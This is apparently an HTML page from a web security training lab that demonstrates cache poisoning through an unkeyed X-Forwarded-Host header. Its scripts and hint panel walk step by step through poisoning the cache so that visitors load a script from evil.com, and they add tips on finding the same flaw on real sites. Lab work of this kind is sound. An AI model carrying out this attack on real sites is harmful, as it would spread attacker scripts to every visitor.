@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NewsWire Admin Console</title>
+  <link rel="stylesheet" href="/css/hint-panel.css">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:#f3f4f6;color:#111827}
+    .hdr{background:#111827;color:#f3f4f6;padding:16px 24px;display:flex;align-items:center;justify-content:space-between}
+    .hdr h1{font-size:18px;font-weight:800}.hdr h1 em{color:#f59e0b;font-style:normal}
+    .wrap{max-width:1100px;margin:0 auto;padding:28px 24px;display:grid;grid-template-columns:1fr 340px;gap:18px}
+    .main h2{font-size:18px;font-weight:700;margin-bottom:6px}.main .desc{font-size:13px;color:#6b7280;margin-bottom:18px}
+    .card{background:#fff;border:1px solid #e5e7eb;border-radius:10px;padding:18px;margin-bottom:14px}
+    .card h3{font-size:14px;font-weight:700;margin-bottom:10px}
+    .iframe-box{border:1px solid #e5e7eb;border-radius:8px;overflow:hidden;margin-top:12px;background:#fff}
+    .iframe-box iframe{width:100%;height:280px;border:none}
+    .input-row{display:flex;gap:6px;margin-bottom:10px}
+    .input-row input{flex:1;padding:8px 12px;border:1px solid #e5e7eb;border-radius:7px;font-size:12px;font-family:monospace}
+    .btn{padding:8px 14px;border-radius:7px;font-size:12px;font-weight:600;cursor:pointer;border:none}.btn-primary{background:#f59e0b;color:#fff}.btn-primary:hover{background:#d97706}.btn-outline{background:#fff;color:#4b5563;border:1px solid #e5e7eb}.btn-danger{background:#ef4444;color:#fff}
+    .output{background:#1f2937;color:#e5e7eb;padding:14px;border-radius:8px;font-family:monospace;font-size:11px;max-height:220px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin-top:10px}
+    .cache-entry{padding:10px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:7px;margin-bottom:6px;font-size:12px}.cache-entry .path{font-family:monospace;color:#f59e0b;font-weight:600}.cache-entry .script{color:#991b1b;font-family:monospace;font-size:11px;margin-top:4px}
+    .attacker{background:#fef2f2;border:2px solid #fecaca}.attacker h3{color:#991b1b}
+    .note{background:#fef3c7;border-left:3px solid #f59e0b;padding:10px 14px;font-size:12px;color:#78350f;margin:10px 0;border-radius:0 6px 6px 0;line-height:1.5}
+    .tag-header{display:inline-block;background:#fef3c7;color:#92400e;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:600;font-family:monospace}
+  </style>
+</head>
+<body>
+  <div class="hdr">
+    <h1><em>News</em>Wire Admin</h1>
+    <div style="font-size:12px;color:#9ca3af">Cache Poisoning Research Lab</div>
+  </div>
+
+  <div class="wrap">
+    <div class="main">
+      <h2>Cache Poisoning via Unkeyed Header</h2>
+      <p class="desc">Observe how the <code>X-Forwarded-Host</code> header is used in the response but NOT in the cache key.</p>
+
+      <div class="card">
+        <h3>Normal Visit</h3>
+        <p style="font-size:12px;color:#6b7280;margin-bottom:8px">Load the NewsWire homepage as a regular user. The cached version will be served to all subsequent visitors.</p>
+        <button class="btn btn-primary" onclick="normalVisit()">Load Homepage</button>
+        <div class="iframe-box" id="normal-box" style="display:none">
+          <iframe id="normal-iframe" src="about:blank"></iframe>
+        </div>
+        <div class="output" id="normal-log">// Request log</div>
+      </div>
+
+      <div class="card attacker">
+        <h3>🎯 Poison the Cache</h3>
+        <p style="font-size:12px;color:#7f1d1d;margin-bottom:8px">Send a request with a custom <code>X-Forwarded-Host</code> header pointing to <code>evil.com</code>. If the header is unkeyed, your payload gets cached and served to all users.</p>
+        <div class="input-row">
+          <input type="text" id="xfh-value" value="evil.com" placeholder="X-Forwarded-Host value">
+          <button class="btn btn-danger" onclick="poisonCache()">Send Poison Request</button>
+        </div>
+        <div class="note"><strong>Header sent:</strong> <span class="tag-header">X-Forwarded-Host: <span id="xfh-preview">evil.com</span></span></div>
+        <div class="output" id="poison-log">// Poison attempt log</div>
+      </div>
+
+      <div class="card">
+        <h3>Verify Poisoning</h3>
+        <p style="font-size:12px;color:#6b7280;margin-bottom:8px">Now fetch the homepage as a normal victim would (no custom headers). If the cache is poisoned, they get the attacker's script src.</p>
+        <button class="btn btn-outline" onclick="victimVisit()">Fetch as Victim (clean request)</button>
+        <div class="iframe-box" id="victim-box" style="display:none">
+          <iframe id="victim-iframe" src="about:blank"></iframe>
+        </div>
+        <div class="output" id="victim-log">// Victim request log</div>
+      </div>
+    </div>
+
+    <div>
+      <div class="card">
+        <h3>📦 Cache <button class="btn btn-outline" onclick="flushCache()" style="float:right;font-size:10px;padding:3px 8px">Flush</button></h3>
+        <div id="cache-panel">
+          <p style="font-size:12px;color:#9ca3af">Empty</p>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>ℹ️ Cache Behavior</h3>
+        <div style="font-size:12px;color:#4b5563;line-height:1.7">
+          <p>&bull; Cache key: URL path <strong>only</strong></p>
+          <p>&bull; <code>X-Forwarded-Host</code> is <strong>not</strong> part of the key</p>
+          <p>&bull; The origin uses <code>X-Forwarded-Host</code> to build the analytics script URL</p>
+          <p>&bull; TTL: 60 seconds (for testing)</p>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>🔎 Response Source</h3>
+        <div style="font-size:12px;color:#4b5563;line-height:1.7">
+          <p>The response template contains:</p>
+          <pre style="background:#1f2937;color:#93c5fd;padding:10px;border-radius:6px;margin-top:6px;font-size:11px;overflow-x:auto;white-space:pre-wrap;word-break:break-all">&lt;script src="//${xfh}/cache-poison/analytics.js"&gt;&lt;/script&gt;</pre>
+          <p style="margin-top:6px;font-size:11px;color:#991b1b"><strong>xfh</strong> = <code>X-Forwarded-Host || Host</code></p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function log(id, msg) { document.getElementById(id).textContent += msg + "\n"; }
+    function clear(id) { document.getElementById(id).textContent = ""; }
+
+    function normalVisit(){
+      clear("normal-log");
+      log("normal-log", "GET /cache-poison/home\nNo custom headers\n");
+      fetch("/cache-poison/home").then(function(r){
+        log("normal-log", "Status: " + r.status);
+        log("normal-log", "X-Cache: " + (r.headers.get("X-Cache") || "(none)"));
+        return r.text();
+      }).then(function(b){
+        var m = b.match(/src="\/\/([^/]+)/);
+        log("normal-log", "\nScript host extracted: " + (m ? m[1] : "?"));
+        document.getElementById("normal-box").style.display = "block";
+        document.getElementById("normal-iframe").srcdoc = b;
+        refreshCache();
+      });
+    }
+
+    function poisonCache(){
+      clear("poison-log");
+      var xfh = document.getElementById("xfh-value").value;
+      document.getElementById("xfh-preview").textContent = xfh;
+      log("poison-log", "GET /cache-poison/home");
+      log("poison-log", "X-Forwarded-Host: " + xfh);
+      log("poison-log", "");
+      fetch("/cache-poison/home", {
+        headers: { "X-Forwarded-Host": xfh }
+      }).then(function(r){
+        log("poison-log", "Status: " + r.status);
+        log("poison-log", "X-Cache: " + (r.headers.get("X-Cache") || "(none)"));
+        return r.text();
+      }).then(function(b){
+        var m = b.match(/src="\/\/([^/]+)/);
+        log("poison-log", "\nScript src now points to: " + (m ? m[1] : "?"));
+        if (m && m[1].indexOf(xfh) !== -1) {
+          log("poison-log", "\n✓ Poison payload baked into response");
+          log("poison-log", "Cache key: /cache-poison/home (no XFH in key!)");
+        }
+        refreshCache();
+      });
+    }
+
+    function victimVisit(){
+      clear("victim-log");
+      log("victim-log", "GET /cache-poison/home");
+      log("victim-log", "(regular browser, no custom headers)\n");
+      fetch("/cache-poison/home").then(function(r){
+        log("victim-log", "Status: " + r.status);
+        log("victim-log", "X-Cache: " + (r.headers.get("X-Cache") || "(none)"));
+        return r.text();
+      }).then(function(b){
+        var m = b.match(/src="\/\/([^/]+)/);
+        log("victim-log", "\nScript src victim sees: " + (m ? m[1] : "?"));
+        if (m && (m[1].indexOf("evil") !== -1 || m[1].indexOf("attacker") !== -1 || !m[1].includes("localhost"))) {
+          log("victim-log", "\n🔥 VICTIM IS SERVING ATTACKER'S SCRIPT");
+          setTimeout(function(){ if (typeof solveLab === "function") solveLab("cache-poison-xfh"); }, 100);
+        }
+        document.getElementById("victim-box").style.display = "block";
+        document.getElementById("victim-iframe").srcdoc = b;
+      });
+    }
+
+    function refreshCache(){
+      fetch("/cache-poison/status").then(function(r){return r.json()}).then(function(d){
+        var panel = document.getElementById("cache-panel");
+        if (!d.cache.length) { panel.innerHTML = '<p style="font-size:12px;color:#9ca3af">Empty</p>'; return; }
+        panel.innerHTML = d.cache.map(function(e){
+          return '<div class="cache-entry"><div class="path">' + e.path + '</div><div class="script">script host: ' + e.cachedScriptHost + '</div><div style="color:#9ca3af;font-size:11px;margin-top:2px">age: ' + e.age + 's</div></div>';
+        }).join("");
+      });
+    }
+
+    function flushCache(){
+      fetch("/cache-poison/flush", {method:"POST"}).then(function(){ refreshCache(); });
+    }
+
+    document.getElementById("xfh-value").addEventListener("input", function(e){
+      document.getElementById("xfh-preview").textContent = e.target.value;
+    });
+
+    refreshCache();
+  </script>
+
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: Cache Poisoning via X-Forwarded-Host</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">The server uses <code>X-Forwarded-Host</code> to build the analytics script's URL. But the cache key doesn't include this header. So any value you inject gets baked into the cached response, served to every subsequent visitor. Based on <a href="https://portswigger.net/research/practical-web-cache-poisoning" style="color:#3b82f6">PortSwigger's practical cache poisoning research</a>.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">1</div><span>Observe the normal response</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Click "Load Homepage" first (without poisoning). The response has <code>X-Cache: MISS, cached</code> and a script tag like <code>&lt;script src="//localhost:3000/...&gt;</code>. Then flush the cache to start clean.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">2</div><span>Find the reflection</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          The server uses <code>X-Forwarded-Host</code> (or falls back to <code>Host</code>) as the hostname for the script tag. Send a request with <code>X-Forwarded-Host: evil.com</code> and the response will include <code>src="//evil.com/..."</code>.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">3</div><span>Poison the cache</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          After the flush, send ONE request with <code>X-Forwarded-Host: evil.com</code>. The cache sees this as a MISS (no entry for <code>/cache-poison/home</code>) and stores your malicious response. The cache key is only the URL path.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">4</div><span>Verify and exfil</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Click "Fetch as Victim" — a clean request without your XFH header. The cache serves the poisoned response. Every visitor now loads analytics from <code>evil.com</code>. Host your JS there → mass XSS.
+        </div>
+      </div>
+
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">🚩 Full Solution</button>
+        <div class="hint-spoiler-content">
+          <p>1. Click "Flush" on the cache panel (start clean).</p>
+          <p>2. In the poison section, <code>X-Forwarded-Host</code> is already <code>evil.com</code>. Click "Send Poison Request".</p>
+          <p>3. Cache panel now shows <code>/cache-poison/home</code> with <code>script host: evil.com</code>.</p>
+          <p>4. Click "Fetch as Victim (clean request)". Victim sees poisoned response.</p>
+          <p><strong>Finding in the wild:</strong> search JS bundles and HTML templates for headers like <code>x-forwarded-host</code>, <code>x-forwarded-scheme</code>, <code>x-original-url</code>, <code>x-host</code>, <code>forwarded</code>. Send them with different values and look for reflection into response body. If response is cacheable AND the header isn't in the cache key, you can poison.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    setupLabVerification('cache-poison-xfh', 'xss');
+    function toggleHints() {
+      document.getElementById('hintPanel').classList.toggle('open');
+      document.getElementById('hintBackdrop').classList.toggle('show');
+    }
+  </script>
+</body>
+</html>
